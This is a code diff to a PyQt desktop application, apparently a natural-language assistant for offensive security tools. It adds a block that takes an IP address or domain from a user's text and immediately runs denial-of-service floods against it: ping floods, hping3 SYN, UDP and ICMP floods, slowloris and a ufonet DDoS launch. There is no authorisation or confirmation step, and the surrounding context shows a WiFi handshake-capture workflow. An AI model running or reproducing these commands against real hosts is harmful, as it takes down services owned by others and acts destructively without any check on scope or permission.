@@ -557,7 +557,39 @@ class MaximWindow(QMainWindow):
             self._execute_command(query)
             return
 
-        # 2. Handshake capture workflow
+        # 2. Stress test / DoS shortcuts
+        target_match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', q_lower)
+        target_ip = target_match.group(1) if target_match else None
+        if not target_ip:
+            # Try domain
+            dm = re.search(r'([a-zA-Z0-9][-a-zA-Z0-9]*\.[a-zA-Z]{2,})', query)
+            if dm and dm.group(1) not in ('of', 'the'):
+                target_ip = dm.group(1)
+
+        if target_ip:
+            if re.search(r'ping\s+(of\s+)?death', q_lower):
+                self._execute_command(f"sudo ping -s 65500 -c 100 {target_ip}")
+                return
+            if re.search(r'ping\s+flood', q_lower):
+                self._execute_command(f"sudo ping -f -s 65500 {target_ip}")
+                return
+            if re.search(r'syn\s+flood', q_lower):
+                self._execute_command(f"sudo hping3 -S --flood -V -p 80 {target_ip}")
+                return
+            if re.search(r'(http|slowloris)\s+(flood|attack|dos)', q_lower) or re.search(r'(flood|attack|dos)\s+(http|slowloris)', q_lower):
+                self._execute_command(f"slowloris {target_ip} -p 80 -s 500")
+                return
+            if re.search(r'udp\s+flood', q_lower):
+                self._execute_command(f"sudo hping3 --udp --flood -p 53 {target_ip}")
+                return
+            if re.search(r'icmp\s+flood', q_lower):
+                self._execute_command(f"sudo hping3 --icmp --flood {target_ip}")
+                return
+            if re.search(r'ufonet\s+(attack|launch|ddos)', q_lower):
+                self._execute_command(f"ufonet -a {target_ip} -r 500 --threads 200")
+                return
+
+        # 3. Handshake capture workflow
         handshake_match = re.search(r'(?:capture|get|grab)\s+(?:the\s+)?handshake\s+(?:on|from|for|of)\s+(.+)', q_lower)
         if not handshake_match:
             handshake_match = re.search(r'handshake\s+(?:on|from|for|of)\s+(.+)', q_lower)
